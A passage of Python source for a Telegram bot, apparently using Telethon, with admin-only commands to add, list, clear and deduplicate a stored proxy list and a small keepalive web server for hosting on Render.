    if event.reply_to_msg_id:
        m = await event.get_reply_message()
        if m and m.file:
            p = await m.download_media()
            try:
                async with aiofiles.open(p, "r", encoding="utf-8", errors="ignore") as f:
                    items += [l.strip() for l in (await f.read()).splitlines() if l.strip()]
            finally:
                try:
                    os.remove(p)
                except Exception:
                    pass
    have = set(get_file_lines(PROXY_FILE))
    add = [f for f in (proxy_flat(x) for x in items) if f and f not in have]
    if not add:
        await event.reply("⚠️ Naya valid proxy nahi mila.")
        return
    with open(PROXY_FILE, "a") as f:
        f.write("\n".join(add) + "\n")
    sync_proxy_file()
    await event.reply(f"✅ {len(add)} proxy added. Total: {len(get_file_lines(PROXY_FILE))}")


@bot.on(events.NewMessage(pattern=r'^/myproxies$'))
async def myproxies(event):
    if not is_admin(event.sender_id):
        return
    px = get_file_lines(PROXY_FILE)
    await event.reply(f"🔌 <b>{len(px)} proxies</b>\n" +
                      "\n".join(f"<code>{p}</code>" for p in px[:40]), parse_mode="html")


@bot.on(events.NewMessage(pattern=r'^/clearproxy$'))
async def clearproxy(event):
    if not is_admin(event.sender_id):
        return
    open(PROXY_FILE, "w").close()
    sync_proxy_file()
    await event.reply(f"🧹 Reset. Total: {len(get_file_lines(PROXY_FILE))}")


@bot.on(events.NewMessage(pattern=r'^/fixproxy$'))
async def fixproxy(event):
    if not is_admin(event.sender_id):
        return
    sync_proxy_file()
    await event.reply(f"🔌 Reset: {len(get_file_lines(PROXY_FILE))} unique")


# ── Render free keepalive ─────────────────────────────────
async def keepalive():
    from aiohttp import web

    async def ping(_):
        return web.Response(text="ok")

    app = web.Application()
    app.router.add_get("/", ping)
    r = web.AppRunner(app)
    await r.setup()
    await web.TCPSite(r, "0.0.0.0", int(os.environ.get("PORT", "8080"))).start()
    print("keepalive up")


if os.environ.get("PORT"):
    bot.loop.create_task(keepalive())

print("✅ bot started")
bot.run_until_disconnected()
